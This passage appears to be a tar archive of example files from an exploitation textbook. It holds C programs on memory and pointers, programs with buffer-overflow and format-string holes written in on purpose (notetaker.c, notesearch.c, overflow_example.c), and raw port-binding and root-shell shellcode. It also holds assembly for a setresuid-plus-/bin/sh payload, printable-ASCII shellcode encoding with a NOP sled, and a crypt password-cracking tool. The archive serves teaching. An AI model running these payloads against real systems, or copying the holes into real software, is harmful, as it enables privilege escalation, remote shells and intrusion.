   mov WORD dx, 0x180   ; S_IRUSR|S_IWUSR
   int 0x80             ; open file to create it
      ; eax = returned file descriptor
   mov ebx, eax         ; file descriptor to second arg
   push BYTE 0x6        ; close ()
   pop eax
   int 0x80  ; close file

   int3   ; interrupt
one:
   call two
db "/HackedX" 
;   01234567
                                                                                                                                                                                                                                                                                                                                                                                                                             memory_segments.c                                                                                   0000644 0001747 0001747 00000002117 12564742435 013756  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

int global_var;
int global_initialized_var = 5;

void function() {  // This is just a demo function
   int stack_var; // notice this variable has the same name as the one in main()

   printf("the function's stack_var is at address 0x%08x\n", &stack_var);
}


int main() {
   int stack_var; // same name as the variable in function()
   static int static_initialized_var = 5;
   static int static_var;
   int *heap_var_ptr;

   heap_var_ptr = (int *) malloc(4);

   // These variables are in the data segment
   printf("global_initialized_var is at address 0x%08x\n", &global_initialized_var);
   printf("static_initialized_var is at address 0x%08x\n\n", &static_initialized_var);

   // These variables are in the bss segment
   printf("static_var is at address 0x%08x\n", &static_var);
   printf("global_var is at address 0x%08x\n\n", &global_var);

   // This variable is in the heap segment
   printf("heap_var is at address 0x%08x\n\n", heap_var_ptr);

   // These variables are in the stack segment
   printf("stack_var is at address 0x%08x\n", &stack_var);
   function();
}  
                                                                                                                                                                                                                                                                                                                                                                                                                                                 notesearch.c                                                                                        0000644 0001747 0001747 00000006573 12564742435 012706  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include "hacking.h"

#define FILENAME "/var/notes"

int print_notes(int, int, char *);   // note printing function
int find_user_note(int, int);        // seek in file for a note for user
int search_note(char *, char *);     // search for keyword function
void fatal(char *);                  // fatal error handler

int main(int argc, char *argv[]) {
	int userid, printing=1, fd; // file descriptor
	char searchstring[100];

	if(argc > 1)                        // If there is an arg
		strcpy(searchstring, argv[1]);   //   that is the search string
	else                                // otherwise
		searchstring[0] = 0;             //   search string is empty

	userid = getuid();
	fd = open(FILENAME, O_RDONLY);   // open the file for read-only access
	if(fd == -1)
		fatal("in main() while opening file for reading");

	while(printing)
		printing = print_notes(fd, userid, searchstring);
	printf("-------[ end of note data ]-------\n");
	close(fd);
}

// A function to print the notes for a given uid that match
// an optional search string
// returns 0 at end of file, 1 if there are still more notes
int print_notes(int fd, int uid, char *searchstring) {
	int note_length;
	char byte=0, note_buffer[100];
	
	note_length = find_user_note(fd, uid);
	if(note_length == -1)  // if end of file reached
		return 0;           //   return 0

	read(fd, note_buffer, note_length); // read note data
	note_buffer[note_length] = 0;       // terminate the string
	
	if(search_note(note_buffer, searchstring)) // if searchstring found
		printf(note_buffer);                    //   print the note
	return 1;
}

// A function to find the next note for a given userID
// returns -1 if the end of the file is reached
// otherwise it returns the length of the found note
int find_user_note(int fd, int user_uid) {
	int note_uid=-1;
	unsigned char byte;
	int length;

	while(note_uid != user_uid) {  // loop until a note for user_uid is found
		if(read(fd, &note_uid, 4) != 4) // read the uid data
			return -1; // if 4 bytes aren't read, return end of file code
		if(read(fd, &byte, 1) != 1) // read the newline separator
         return -1;

		byte = length = 0;
		while(byte != '\n') {  // figure out how many bytes to the end of line
			if(read(fd, &byte, 1) != 1) // read a single byte
				return -1;     // if byte isn't read, return end of file code
			length++;  
		}
	}
	lseek(fd, length * -1, SEEK_CUR); // rewind file reading by length bytes

	printf("[DEBUG] found a %d byte note for user id %d\n", length, note_uid);
	return length;
}

// A function to search a note for a given keyword
// returns 1 if a match is found, 0 if there is no match
int search_note(char *note, char *keyword) {
	int i, keyword_length, match=0;

	keyword_length = strlen(keyword);
	if(keyword_length == 0)  // if there is no search string
		return 1;              // always "match"
	
	for(i=0; i < strlen(note); i++) { // iterate over bytes in note
		if(note[i] == keyword[match])  // if byte matches keyword
			match++;   // get ready to check the next byte
		else {        //   otherwise
			if(note[i] == keyword[0]) // if that byte matches first keyword byte
				match = 1;  // start the match count at 1
			else
				match = 0;  // otherwise it is zero
		}
		if(match == keyword_length) // if there is a full match
			return 1;   // return matched
	}
	return 0;  // return not matched
}

                                                                                                                                     notetaker.c                                                                                         0000644 0001747 0001747 00000003173 12564742435 012540  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include "hacking.h"

void usage(char *prog_name, char *filename) {
   printf("Usage: %s <data to add to %s>\n", prog_name, filename);
   exit(0);
}

void fatal(char *);            // a function for fatal errors
void *ec_malloc(unsigned int); // an errorchecked malloc() wrapper

int main(int argc, char *argv[]) {
   int userid, fd; // file descriptor
   char *buffer, *datafile;

   buffer = (char *) ec_malloc(100);
   datafile = (char *) ec_malloc(20);
   strcpy(datafile, "/var/notes");

   if(argc < 2)                // If there aren't commandline arguments
      usage(argv[0], datafile); // display usage message and exit

   strcpy(buffer, argv[1]);  // copy into buffer

   printf("[DEBUG] buffer   @ %p: \'%s\'\n", buffer, buffer);
   printf("[DEBUG] datafile @ %p: \'%s\'\n", datafile, datafile);

 // Opening the file
   fd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);
   if(fd == -1)
      fatal("in main() while opening file");
   printf("[DEBUG] file descriptor is %d\n", fd);

   userid = getuid(); // get the real user ID

// Writing data
   if(write(fd, &userid, 4) == -1) // write user ID before note data
      fatal("in main() while writing userid to file");
   write(fd, "\n", 1); // terminate line

   if(write(fd, buffer, strlen(buffer)) == -1) // write note
      fatal("in main() while writing buffer to file");
   write(fd, "\n", 1); // terminate line

// Closing file
   if(close(fd) == -1)
      fatal("in main() while closing file");

   printf("Note has been saved.\n");
   free(buffer);
   free(datafile);
}
                                                                                                                                                                                                                                                                                                                                                                                                     overflow_example.c                                                                                  0000644 0001747 0001747 00000001613 12564742435 014117  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <string.h>

int main(int argc, char *argv[]) {
	int value = 5;
	char buffer_one[8], buffer_two[8];

	strcpy(buffer_one, "one"); /* put "one" into buffer_one */
	strcpy(buffer_two, "two"); /* put "two" into buffer_two */
	
	printf("[BEFORE] buffer_two is at %p and contains \'%s\'\n", buffer_two, buffer_two);
	printf("[BEFORE] buffer_one is at %p and contains \'%s\'\n", buffer_one, buffer_one);
	printf("[BEFORE] value is at %p and is %d (0x%08x)\n", &value, value, value);

	printf("\n[STRCPY] copying %d bytes into buffer_two\n\n",  strlen(argv[1]));
	strcpy(buffer_two, argv[1]); /* copy first argument into buffer_two */

	printf("[AFTER] buffer_two is at %p and contains \'%s\'\n", buffer_two, buffer_two);
	printf("[AFTER] buffer_one is at %p and contains \'%s\'\n", buffer_one, buffer_one);
	printf("[AFTER] value is at %p and is %d (0x%08x)\n", &value, value, value);
}
                                                                                                                     pcap_sniff.c                                                                                        0000644 0001747 0001747 00000001362 12564742435 012652  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <pcap.h>
#include "hacking.h"

void pcap_fatal(const char *failed_in, const char *errbuf) {
	printf("Fatal Error in %s: %s\n", failed_in, errbuf);
	exit(1);
}

int main() {
	struct pcap_pkthdr header;
	const u_char *packet;
	char errbuf[PCAP_ERRBUF_SIZE];
	char *device;
	pcap_t *pcap_handle;
	int i;

	device = pcap_lookupdev(errbuf);
	if(device == NULL)
		pcap_fatal("pcap_lookupdev", errbuf);

	printf("Sniffing on device %s\n", device);
	
	pcap_handle = pcap_open_live(device, 4096, 1, 0, errbuf);
	if(pcap_handle == NULL)
		pcap_fatal("pcap_open_live", errbuf);
	
	for(i=0; i < 3; i++) {
		packet = pcap_next(pcap_handle, &header);
		printf("Got a %d byte packet\n", header.len);
		dump(packet, header.len);
	}

	pcap_close(pcap_handle);
}
                                                                                                                                                                                                                                                                              pointer.c                                                                                           0000644 0001747 0001747 00000001046 12564742435 012221  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <string.h>

int main() {
   char str_a[20];  // a 20 element character array
   char *pointer;   // a pointer, meant for a character array
   char *pointer2;  // and yet another one

   strcpy(str_a, "Hello World\n");
   pointer = str_a; // set the first pointer to the start of the array
   printf(pointer);

   pointer2 = pointer + 2; // set the second one 2 bytes further in
   printf(pointer2);       // print it
   strcpy(pointer2, "y you guys!\n"); // copy into that spot
   printf(pointer);        // print again
}
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          pointer_types2.c                                                                                    0000644 0001747 0001747 00000001377 12564742435 013536  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

int main() {
	int i;

	char char_array[5] = {'a', 'b', 'c', 'd', 'e'};
	int int_array[5] = {1, 2, 3, 4, 5};

	char *char_pointer;
	int *int_pointer;

	char_pointer = int_array; // The char_pointer and int_pointer now
	int_pointer = char_array; // point to incompatable data types

	for(i=0; i < 5; i++) { // iterate through the int array with the int_pointer
		printf("[integer pointer] points to %p, which contains the char '%c'\n",
            int_pointer, *int_pointer);
		int_pointer = int_pointer + 1;
	}
	
	for(i=0; i < 5; i++) { // iterate through the char array with the char_pointer
		printf("[char pointer] points to %p, which contains the integer %d\n",
            char_pointer, *char_pointer);
		char_pointer = char_pointer + 1;
	}
}
                                                                                                                                                                                                                                                                 pointer_types3.c                                                                                    0000644 0001747 0001747 00000001427 12564742435 013533  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

int main() {
	int i;

	char char_array[5] = {'a', 'b', 'c', 'd', 'e'};
	int int_array[5] = {1, 2, 3, 4, 5};

	char *char_pointer;
	int *int_pointer;

	char_pointer = (char *) int_array; // Typecast into the
	int_pointer = (int *) char_array;  // pointer's data type

	for(i=0; i < 5; i++) { // iterate through the int array with the int_pointer
		printf("[integer pointer] points to %p, which contains the char '%c'\n",
            int_pointer, *int_pointer);
		int_pointer = (int *) ((char *) int_pointer + 1);
	}
	
	for(i=0; i < 5; i++) { // iterate through the char array with the char_pointer
		printf("[char pointer] points to %p, which contains the integer %d\n",
            char_pointer, *char_pointer);
		char_pointer = (char *) ((int *) char_pointer + 1);
	}
}
                                                                                                                                                                                                                                         pointer_types4.c                                                                                    0000644 0001747 0001747 00000001362 12564742435 013532  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

int main() {
	int i;

	char char_array[5] = {'a', 'b', 'c', 'd', 'e'};
	int int_array[5] = {1, 2, 3, 4, 5};

	void *void_pointer;

	void_pointer = (void *) char_array;

	for(i=0; i < 5; i++) { // iterate through the int array with the int_pointer
		printf("[char pointer] points to %p, which contains the char '%c'\n",
            void_pointer, *((char *) void_pointer));
		void_pointer = (void *) ((char *) void_pointer + 1);
	}

	void_pointer = (void *) int_array;
	
	for(i=0; i < 5; i++) { // iterate through the int array with the int_pointer
		printf("[integer pointer] points to %p, which contains the integer %d\n",
            void_pointer, *((int *) void_pointer));
		void_pointer = (void *) ((int *) void_pointer + 1);
	}
}
                                                                                                                                                                                                                                                                              pointer_types5.c                                                                                    0000644 0001747 0001747 00000001444 12564742435 013534  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

int main() {
	int i;

	char char_array[5] = {'a', 'b', 'c', 'd', 'e'};
	int int_array[5] = {1, 2, 3, 4, 5};

	unsigned int hacky_nonpointer;

	hacky_nonpointer = (unsigned int) char_array;

	for(i=0; i < 5; i++) { // iterate through the int array with the int_pointer
		printf("[hacky_nonpointer] points to %p, which contains the char '%c'\n",
            hacky_nonpointer, *((char *) hacky_nonpointer));
		hacky_nonpointer = hacky_nonpointer + sizeof(char);
	}

	hacky_nonpointer = (unsigned int) int_array;
	
	for(i=0; i < 5; i++) { // iterate through the int array with the int_pointer
		printf("[hacky_nonpointer] points to %p, which contains the integer %d\n",
            hacky_nonpointer, *((int *) hacky_nonpointer));
		hacky_nonpointer = hacky_nonpointer + sizeof(int);
	}
}
                                                                                                                                                                                                                            pointer_types.c                                                                                     0000644 0001747 0001747 00000001265 12564742435 013450  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>

int main() {
	int i;

	char char_array[5] = {'a', 'b', 'c', 'd', 'e'};
	int int_array[5] = {1, 2, 3, 4, 5};

	char *char_pointer;
	int *int_pointer;

	char_pointer = char_array;
	int_pointer = int_array;

	for(i=0; i < 5; i++) { // iterate through the int array with the int_pointer
		printf("[integer pointer] points to %p, which contains the integer %d\n", 
            int_pointer, *int_pointer);
		int_pointer = int_pointer + 1;
	}
	
	for(i=0; i < 5; i++) { // iterate through the char array with the char_pointer
		printf("[char pointer] points to %p, which contains the char '%c'\n", 
            char_pointer, *char_pointer);
		char_pointer = char_pointer + 1;
	}
}
                                                                                                                                                                                                                                                                                                                                           portbinding_shellcode                                                                               0000644 0001747 0001747 00000000134 12564742435 014656  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 jfX�1�CRjj��̀�jfXCRfhzifS��jQV��̀�fCCSV��̀�fCRRV��̀�jY�?̀Iy��Rh//shh/bin��R��S��̀                                                                                                                                                                                                                                                                                                                                                                                                                                    ppm_crack.c                                                                                         0000644 0001747 0001747 00000016601 12564742435 012503  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 /*********************************************************\
*  Password Probability Matrix   *    File: ppm_crack.c   *
***********************************************************
*                                                         *
*  Author:        Jon Erickson <matrix@phiral.com>        *
*  Organization:  Phiral Research Laboratories            *
*                                                         *
*  This is the crack program for the PPM proof of concept.*
*  It uses an existing file called 4char.ppm, which       *
*  contains information regarding all possible 4          *
*  character passwords salted with 'je'.  This file can   *
*  be generated with the corresponding ppm_gen.c program. *
*                                                         *
\*********************************************************/

#define _XOPEN_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

#define HEIGHT 16384
#define WIDTH  1129
#define DEPTH 8
#define SIZE HEIGHT * WIDTH * DEPTH
#define DCM HEIGHT * WIDTH

/* map a single hash byte to an enumerated value */
int enum_hashbyte(char a) {
   int i, j;
   i = (int)a;
   if((i >= 46) && (i <= 57))
      j = i - 46;
   else if ((i >= 65) && (i <= 90))
      j = i - 53;
   else if ((i >= 97) && (i <= 122))
      j = i - 59;
   return j;
}

/* map 3 hash bytes to an enumerated value */
int enum_hashtriplet(char a, char b, char c) {
   return (((enum_hashbyte(c)%4)*4096)+(enum_hashbyte(a)*64)+enum_hashbyte(b));
}

/* merge two vectors */
void merge(char *vector1, char *vector2) {
   int i;
   for(i=0; i < WIDTH; i++)
      vector1[i] &= vector2[i];
}

/* returns the bit in the vector at the passed index position */
int get_vector_bit(char *vector, int index) {
   return ((vector[(index/8)]&(1<<(index%8)))>>(index%8));
}

/* counts the number of plaintext pairs in the passed vector */
int count_vector_bits(char *vector) {
   int i, count=0;
   for(i=0; i < 9025; i++)
      count += get_vector_bit(vector, i); 
   return count;
}

/* print the plaintext pairs that each ON bit in the vector enumerates */
void print_vector(char *vector) {
   int i, a, b, val;
   for(i=0; i < 9025; i++) {
      if(get_vector_bit(vector, i) == 1) { // if bit is on
         a = i / 95;                  // calculate the
         b = i - (a * 95);            // plaintext pair
         printf("%c%c ",a+32, b+32);  // and print it
      }
   }
   printf("\n");
}

/* barf a message and exit */
void barf(char *message, char *extra) {
   printf(message, extra);
   exit(1);
}

/* crack a 4 character password using generated 4char.ppm file */
int main(int argc, char *argv[]) {
  char *pass, plain[5];
  unsigned char bin_vector1[WIDTH], bin_vector2[WIDTH], temp_vector[WIDTH];
  char prob_vector1[2][9025];
  char prob_vector2[2][9025];
  int a, b, i, j, len, pv1_len=0, pv2_len=0;
  FILE *fd;
 
  if(argc < 1)
     barf("Usage: %s <password hash>  (will use the file 4char.ppm)\n", argv[0]);

  if(!(fd = fopen("4char.ppm", "r"))) 
     barf("Fatal: Couldn't open PPM file for reading.\n", NULL);

  pass = argv[1]; // first argument is password hash

  printf("Filtering possible plaintext bytes for the first two characters:\n");

  fseek(fd,(DCM*0)+enum_hashtriplet(pass[2], pass[3], pass[4])*WIDTH, SEEK_SET);
  fread(bin_vector1, WIDTH, 1, fd); // read the vector associating bytes 2-4 of hash

  len = count_vector_bits(bin_vector1);
  printf("only 1 vector of 4:\t%d plaintext pairs, with %0.2f%% saturation\n", len, len*100.0/9025.0);

  fseek(fd,(DCM*1)+enum_hashtriplet(pass[4], pass[5], pass[6])*WIDTH, SEEK_SET);
  fread(temp_vector, WIDTH, 1, fd); // read the vector associating bytes 4-6 of hash
  merge(bin_vector1, temp_vector);  // merge it with the first vector

  len = count_vector_bits(bin_vector1);
  printf("vectors 1 AND 2 merged:\t%d plaintext pairs, with %0.2f%% saturation\n", len, len*100.0/9025.0);

  fseek(fd,(DCM*2)+enum_hashtriplet(pass[6], pass[7], pass[8])*WIDTH, SEEK_SET);
  fread(temp_vector, WIDTH, 1, fd); // read the vector associating bytes 6-8 of hash
  merge(bin_vector1, temp_vector);  // merge it with the first two vectors

  len = count_vector_bits(bin_vector1);
  printf("first 3 vectors merged:\t%d plaintext pairs, with %0.2f%% saturation\n", len, len*100.0/9025.0);

  fseek(fd,(DCM*3)+enum_hashtriplet(pass[8], pass[9],pass[10])*WIDTH, SEEK_SET);
  fread(temp_vector, WIDTH, 1, fd); // read the vector associatind bytes 8-10 of hash
  merge(bin_vector1, temp_vector);  // merge it with the othes vectors

  len = count_vector_bits(bin_vector1);
  printf("all 4 vectors merged:\t%d plaintext pairs, with %0.2f%% saturation\n", len, len*100.0/9025.0);

  printf("Possible plaintext pairs for the first two bytes:\n");
  print_vector(bin_vector1);

  printf("\nFiltering possible plaintext bytes for the last two characters:\n");

  fseek(fd,(DCM*4)+enum_hashtriplet(pass[2], pass[3], pass[4])*WIDTH, SEEK_SET);
  fread(bin_vector2, WIDTH, 1, fd); // read the vector associating bytes 2-4 of hash

  len = count_vector_bits(bin_vector2);
  printf("only 1 vector of 4:\t%d plaintext pairs, with %0.2f%% saturation\n", len, len*100.0/9025.0);

  fseek(fd,(DCM*5)+enum_hashtriplet(pass[4], pass[5], pass[6])*WIDTH, SEEK_SET);
  fread(temp_vector, WIDTH, 1, fd); // read the vector associating bytes 4-6 of hash
  merge(bin_vector2, temp_vector);  // merge it with the first vector

  len = count_vector_bits(bin_vector2);
  printf("vectors 1 AND 2 merged:\t%d plaintext pairs, with %0.2f%% saturation\n", len, len*100.0/9025.0);

  fseek(fd,(DCM*6)+enum_hashtriplet(pass[6], pass[7], pass[8])*WIDTH, SEEK_SET);
  fread(temp_vector, WIDTH, 1, fd); // read the vector associating bytes 6-8 of hash
  merge(bin_vector2, temp_vector);  // merge it with the first two vectors

  len = count_vector_bits(bin_vector2);
  printf("first 3 vectors merged:\t%d plaintext pairs, with %0.2f%% saturation\n", len, len*100.0/9025.0);

  fseek(fd,(DCM*7)+enum_hashtriplet(pass[8], pass[9],pass[10])*WIDTH, SEEK_SET);
  fread(temp_vector, WIDTH, 1, fd); // read the vector associatind bytes 8-10 of hash
  merge(bin_vector2, temp_vector);  // merge it with the othes vectors

  len = count_vector_bits(bin_vector2);
  printf("all 4 vectors merged:\t%d plaintext pairs, with %0.2f%% saturation\n", len, len*100.0/9025.0);
  
  printf("Possible plaintext pairs for the last two bytes:\n");
  print_vector(bin_vector2);

  printf("Building probability vectors...\n");
  for(i=0; i < 9025; i++) { // find possible first two plaintext bytes
    if(get_vector_bit(bin_vector1, i)==1) {;
      prob_vector1[0][pv1_len] = i / 95;
      prob_vector1[1][pv1_len] = i - (prob_vector1[0][pv1_len] * 95);
      pv1_len++;
    }
  }
  for(i=0; i < 9025; i++) { // find possible last two plaintext bytes
    if(get_vector_bit(bin_vector2, i)) {
      prob_vector2[0][pv2_len] = i / 95;
      prob_vector2[1][pv2_len] = i - (prob_vector2[0][pv2_len] * 95);
      pv2_len++;
    }
  }

  printf("Cracking remaining %d possibilites..\n", pv1_len*pv2_len);
  for(i=0; i < pv1_len; i++) {
    for(j=0; j < pv2_len; j++) {
      plain[0] = prob_vector1[0][i] + 32;
      plain[1] = prob_vector1[1][i] + 32;
      plain[2] = prob_vector2[0][j] + 32;
      plain[3] = prob_vector2[1][j] + 32;
      plain[4] = 0;
      if(strcmp(crypt(plain, "je"), pass) == 0) {
        printf("Password :  %s\n", plain);
        i = 31337;
        j = 31337;
      }
    }
  }
  if(i < 31337)
    printf("Password wasn't salted with 'je' or is not 4 chars long.\n");

  fclose(fd);
}
                                                                                                                               ppm_gen.c                                                                                           0000644 0001747 0001747 00000010472 12564742435 012171  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 /*********************************************************\
*  Password Probability Matrix   *    File: ppm_gen.c     *
***********************************************************
*                                                         *
*  Author:        Jon Erickson <matrix@phiral.com>        *
*  Organization:  Phiral Research Laboratories            *
*                                                         *
*  This is the generate program for the PPM proof of      *
*  concept.  It generates a file called 4char.ppm, which  *
*  contains information regarding all possible 4          *
*  character passwords salted with 'je'.  This file can   *
*  be used to quickly crack passwords found within this   *
*  keyspace with the corresponding ppm_crack.c program.   *
*                                                         *
\*********************************************************/

#define _XOPEN_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

#define HEIGHT 16384
#define WIDTH  1129
#define DEPTH  8
#define SIZE HEIGHT * WIDTH * DEPTH

/* map a single hash byte to an enumerated value */
int enum_hashbyte(char a) {
   int i, j;
   i = (int)a;
   if((i >= 46) && (i <= 57))
      j = i - 46;
   else if ((i >= 65) && (i <= 90))
      j = i - 53;
   else if ((i >= 97) && (i <= 122))
      j = i - 59;
   return j;
}

/* map 3 hash bytes to an enumerated value */
int enum_hashtriplet(char a, char b, char c) {
   return (((enum_hashbyte(c)%4)*4096)+(enum_hashbyte(a)*64)+enum_hashbyte(b));
}
/* barf a message and exit */
void barf(char *message, char *extra) {
   printf(message, extra);
   exit(1);
}

/* Generate a 4char.ppm file with all possible 4 char passwords (salted w/ je) */
int main() {
   char plain[5];
   char *code, *data;
   int i, j, k, l;
   unsigned int charval, val;
   FILE *handle;
   if (!(handle = fopen("4char.ppm", "w")))
      barf("Error: Couldn't open file '4char.ppm' for writing.\n", NULL);

   data = (char *) malloc(SIZE);
   if (!(data))
      barf("Error: Couldn't allocate memory.\n", NULL);

   for(i=32; i<127; i++) {
      for(j=32; j<127; j++) {
         printf("Adding %c%c** to 4char.ppm..\n", i, j);
         for(k=32; k<127; k++) {
            for(l=32; l<127; l++) {

               plain[0]  = (char)i; // build every
               plain[1]  = (char)j; // possible 4 byte
               plain[2]  = (char)k; // password.
               plain[3]  = (char)l;
               plain[4]  = '\0';
               code = crypt((const char *)plain, (const char *)"je"); // hash it

               /* lossfully store statistical info about the pairings */
               val = enum_hashtriplet(code[2], code[3], code[4]); // store info about bytes 2-4 
               charval = (i-32)*95 + (j-32); // first 2 plaintext bytes
               data[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));
               val += (HEIGHT * 4);
               charval = (k-32)*95 + (l-32); // last 2 plaintext bytes
               data[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));

               val = HEIGHT + enum_hashtriplet(code[4], code[5], code[6]); // bytes 4-6
               charval = (i-32)*95 + (j-32); // first 2 plaintext bytes
               data[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));
               val += (HEIGHT * 4);
               charval = (k-32)*95 + (l-32); // last 2 plaintext bytes
               data[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));

               val = (2 * HEIGHT) + enum_hashtriplet(code[6], code[7], code[8]); // bytes 6-8
               charval = (i-32)*95 + (j-32); // first 2 plaintext bytes
               data[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));
               val += (HEIGHT * 4);
               charval = (k-32)*95 + (l-32); // last 2 plaintext bytes
               data[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));

               val = (3 * HEIGHT) + enum_hashtriplet(code[8], code[9], code[10]); // bytes 8-10
               charval = (i-32)*95 + (j-32); // first 2 plaintext chars
               data[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8)); 
               val += (HEIGHT * 4);
               charval = (k-32)*95 + (l-32); // last 2 plaintext bytes
               data[(val*WIDTH)+(charval/8)] |=  (1<<(charval%8));
            }
         }
      }
   }
   printf("finished.. saving..\n");
   fwrite(data, SIZE, 1, handle);
   free(data);
   fclose(handle);
}
                                                                                                                                                                                                      printable_helper.c                                                                                  0000644 0001747 0001747 00000004553 12564742435 014066  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 #include <stdio.h>
#include <sys/stat.h>
#include <ctype.h>
#include <time.h>
#include <stdlib.h>
#include <string.h>

#define CHR "%_01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-"

int main(int argc, char* argv[])
{
   unsigned int targ, last, t[4], l[4];
   unsigned int try, single, carry=0;
   int len, a, i, j, k, m, z, flag=0;
   char word[3][4];
   unsigned char mem[70];

   if(argc < 2) {
      printf("Usage: %s <EAX starting value> <EAX end value>\n", argv[0]);
      exit(1);
   }

   srand(time(NULL));
   bzero(mem, 70);
   strcpy(mem, CHR);
   len = strlen(mem);
   strfry(mem); // randomize
   last = strtoul(argv[1], NULL, 0);
   targ = strtoul(argv[2], NULL, 0);

   printf("calculating printable values to subtract from EAX..\n\n");
   t[3] = (targ & 0xff000000)>>24; // spliting by bytes
   t[2] = (targ & 0x00ff0000)>>16;
   t[1] = (targ & 0x0000ff00)>>8;
   t[0] = (targ & 0x000000ff);
   l[3] = (last & 0xff000000)>>24;
   l[2] = (last & 0x00ff0000)>>16;
   l[1] = (last & 0x0000ff00)>>8;
   l[0] = (last & 0x000000ff);

   for(a=1; a < 5; a++) { // value count
      carry = flag = 0;
      for(z=0; z < 4; z++) { // byte count
         for(i=0; i < len; i++) {
            for(j=0; j < len; j++) {
               for(k=0; k < len; k++) {
                  for(m=0; m < len; m++)
                  {
                     if(a < 2) j = len+1;
                     if(a < 3) k = len+1;
                     if(a < 4) m = len+1;
                     try = t[z] + carry+mem[i]+mem[j]+mem[k]+mem[m];
                     single = (try & 0x000000ff);
                     if(single == l[z])
                     {
                        carry = (try & 0x0000ff00)>>8;
                        if(i < len) word[0][z] = mem[i];
                        if(j < len) word[1][z] = mem[j];
                        if(k < len) word[2][z] = mem[k];
                        if(m < len) word[3][z] = mem[m];
                        i = j = k = m = len+2;
                        flag++;
                     }
                  }
               }
            }
         }
      }
      if(flag == 4) { // if all 4 bytes found
         printf("start: 0x%08x\n\n", last);
         for(i=0; i < a; i++)
            printf("     - 0x%08x\n", *((unsigned int *)word[i]));
         printf("-------------------\n");
         printf("end:   0x%08x\n", targ);

         exit(0);
      }
   }
}
                                                                                                                                                     printable.s                                                                                         0000644 0001747 0001747 00000003461 12564742435 012544  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32
push esp                ; Put current ESP
pop eax                 ;   into EAX
sub eax,0x39393333      ; Subtract printable values 
sub eax,0x72727550      ;   to add 860 to EAX
sub eax,0x54545421
push eax                ; Put EAX back into ESP
pop esp                 ;   Effectively ESP = ESP + 860
and eax,0x454e4f4a      
and eax,0x3a313035      ; Zero out EAX

sub eax,0x346d6d25      ; Subtract printable values 
sub eax,0x256d6d25      ;   to make EAX = 0x80cde189 
sub eax,0x2557442d      ;   (last 4 bytes from shellcode.bin)
push eax                ; Push these bytes to stack at ESP
sub eax,0x59316659      ; Subtract more printable values
sub eax,0x59667766      ;  to make EAX = 0x53e28951 
sub eax,0x7a537a79      ;  (next 4 bytes of shellcode from the end)
push eax                
sub eax,0x25696969      
sub eax,0x25786b5a
sub eax,0x25774625
push eax                ; EAX = 0xe3896e69
sub eax,0x366e5858      
sub eax,0x25773939
sub eax,0x25747470
push eax                ; EAX = 0x622f6868
sub eax,0x25257725
sub eax,0x71717171
sub eax,0x5869506a
push eax                ; EAX = 0x732f2f68
sub eax,0x63636363
sub eax,0x44307744
sub eax,0x7a434957
push eax                ; EAX = 0x51580b6a
sub eax,0x63363663
sub eax,0x6d543057
push eax                ; EAX = 0x80cda4b0
sub eax,0x54545454
sub eax,0x304e4e25
sub eax,0x32346f25
sub eax,0x302d6137
push eax                ; EAX = 0x99c931db
sub eax,0x78474778
sub eax,0x78727272
sub eax,0x774f4661
push eax                ; EAX = 0x31c03190
sub eax,0x41704170
sub eax,0x2d772d4e
sub eax,0x32483242
push eax                ; EAX = 0x90909090
push eax
push eax                ; build a NOP sled
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax

                                                                                                                                                                                                               priv_shell                                                                                          0000644 0001747 0001747 00000000045 12564742435 012465  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 1�1�1�1Ұ�̀1��Qh//shh/bin��Q��S��̀                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           priv_shell.s                                                                                        0000644 0001747 0001747 00000001763 12564742435 012736  0                                                                                                    ustar   reader                          reader                                                                                                                                                                                                                 BITS 32

; setresuid(uid_t ruid, uid_t euid, uid_t suid);
  xor eax, eax      ; zero out eax
  xor ebx, ebx      ; zero out ebx
  xor ecx, ecx      ; zero out ecx
  xor edx, edx      ; zero out edx
  mov al,  0xa4     ; 164 (0xa4) for syscall #164
  int 0x80          ; setresuid(0, 0, 0)  restore all root privs

; execve(const char *filename, char *const argv [], char *const envp[])
  xor eax, eax      ; make sure eax is zeroed again
  mov al, 11        ; syscall #11
  push ecx          ; push some nulls for string termination
  push 0x68732f2f   ; push "//sh" to the stack
  push 0x6e69622f   ; push "/bin" to the stack
  mov ebx, esp      ; put the address of "/bin//sh" into ebx, via esp
  push ecx          ; push 32-bit null terminator to stack
  mov edx, esp      ; this is an empty array for envp
  push ebx          ; push string addr to stack above null terminator
